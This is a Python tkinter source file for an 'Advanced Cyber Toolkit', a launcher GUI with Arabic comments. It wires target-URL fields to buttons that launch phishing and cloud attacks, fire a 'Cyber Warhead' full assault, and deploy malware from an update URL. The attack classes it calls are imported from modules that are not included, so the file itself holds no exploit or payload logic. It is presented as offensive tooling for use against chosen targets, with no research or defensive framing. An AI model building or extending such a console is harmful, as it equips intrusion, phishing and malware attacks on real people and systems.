import tkinter as tk
from tkinter import messagebox, ttk
import subprocess
import threading
import sys
import os

# استيراد الوظائف من الملفات الأخرى
from Analyse import AdvancedScraper
from dam import AdvancedTargetedExploitPro
from danger import CyberNuclearWarhead
from sa import AdvancedMalware

class CyberToolkitGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Cyber Toolkit")
        self.root.geometry("800x600")
        
        # إنشاء تبويبات للوظائف المختلفة
        self.tab_control = ttk.Notebook(root)
        
        # تبويب الاستهداف الذكي
        self.tab_scraping = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_scraping, text="Web Scraping")
        self.setup_scraping_tab()
        
        # تبويب الهجمات المتقدمة
        self.tab_exploit = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_exploit, text="Advanced Exploits")
        self.setup_exploit_tab()
        
        # تبويب الأسلحة السيبرانية
        self.tab_warhead = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_warhead, text="Cyber Warhead")
        self.setup_warhead_tab()
        
        # تبويب البرمجيات الخبيثة
        self.tab_malware = ttk.Frame(self.tab_control)
        self.tab_control.add(self.tab_malware, text="Advanced Malware")
        self.setup_malware_tab()
        
        self.tab_control.pack(expand=1, fill="both")
    
    def setup_scraping_tab(self):
        # واجهة الاستهداف الذكي
        label = tk.Label(self.tab_scraping, text="Web Scraping Tools", font=("Arial", 16))
        label.pack(pady=10)
        
        self.url_entry = tk.Entry(self.tab_scraping, width=50)
        self.url_entry.pack(pady=10)
        self.url_entry.insert(0, "Enter target URL")
        
        self.scrape_button = tk.Button(self.tab_scraping, text="Start Scraping", command=self.start_scraping)
        self.scrape_button.pack(pady=10)
        
        self.result_text = tk.Text(self.tab_scraping, height=20, width=80)
        self.result_text.pack(pady=10)
    
    def setup_exploit_tab(self):
        # واجهة الهجمات المتقدمة
        label = tk.Label(self.tab_exploit, text="Advanced Exploit Tools", font=("Arial", 16))
        label.pack(pady=10)
        
        self.target_entry = tk.Entry(self.tab_exploit, width=50)
        self.target_entry.pack(pady=10)
        self.target_entry.insert(0, "Enter target URL")
        
        self.phishing_button = tk.Button(self.tab_exploit, text="Launch Phishing Attack", command=self.launch_phishing)
        self.phishing_button.pack(pady=10)
        
        self.cloud_button = tk.Button(self.tab_exploit, text="Launch Cloud Attack", command=self.launch_cloud_attack)
        self.cloud_button.pack(pady=10)
    
    def setup_warhead_tab(self):
        # واجهة الأسلحة السيبرانية
        label = tk.Label(self.tab_warhead, text="Cyber Warhead Tools", font=("Arial", 16))
        label.pack(pady=10)
        
        self.launch_button = tk.Button(self.tab_warhead, text="Launch Cyber Warhead", command=self.launch_warhead)
        self.launch_button.pack(pady=10)
    
    def setup_malware_tab(self):
        # واجهة البرمجيات الخبيثة
        label = tk.Label(self.tab_malware, text="Advanced Malware Tools", font=("Arial", 16))
        label.pack(pady=10)
        
        self.update_url_entry = tk.Entry(self.tab_malware, width=50)
        self.update_url_entry.pack(pady=10)
        self.update_url_entry.insert(0, "Enter update URL")
        
        self.malware_button = tk.Button(self.tab_malware, text="Deploy Malware", command=self.deploy_malware)
        self.malware_button.pack(pady=10)
    
    def start_scraping(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("Error", "Please enter a valid URL")
            return
        
        def scraping_thread():
            scraper = AdvancedScraper()
            scraper.parallel_scrape([url])
            self.result_text.insert(tk.END, f"Scraping completed for {url}\n")
        
        threading.Thread(target=scraping_thread).start()
    
    def launch_phishing(self):
        target = self.target_entry.get()
        if not target:
            messagebox.showerror("Error", "Please enter a valid target URL")
            return
        
        def phishing_thread():
            exploit = AdvancedTargetedExploitPro(target)
            exploit.attack_vectors['phishing']()
            messagebox.showinfo("Success", "Phishing attack launched successfully")
        
        threading.Thread(target=phishing_thread).start()
    
    def launch_cloud_attack(self):
        target = self.target_entry.get()
        if not target:
            messagebox.showerror("Error", "Please enter a valid target URL")
            return
        
        def cloud_attack_thread():
            exploit = AdvancedTargetedExploitPro(target)
            exploit.attack_vectors['cloud']()
            messagebox.showinfo("Success", "Cloud attack launched successfully")
        
        threading.Thread(target=cloud_attack_thread).start()
    
    def launch_warhead(self):
        def warhead_thread():
            warhead = CyberNuclearWarhead()
            warhead.launch_full_assault()
            messagebox.showinfo("Success", "Cyber Warhead launched successfully")
        
        threading.Thread(target=warhead_thread).start()
    
    def deploy_malware(self):
        update_url = self.update_url_entry.get()
        if not update_url:
            messagebox.showerror("Error", "Please enter a valid update URL")
            return
        
        def malware_thread():
            malware = AdvancedMalware(update_url)
            malware.secure_update_check()
            messagebox.showinfo("Success", "Malware deployed successfully")
        
        threading.Thread(target=malware_thread).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberToolkitGUI(root)
    root.mainloop()
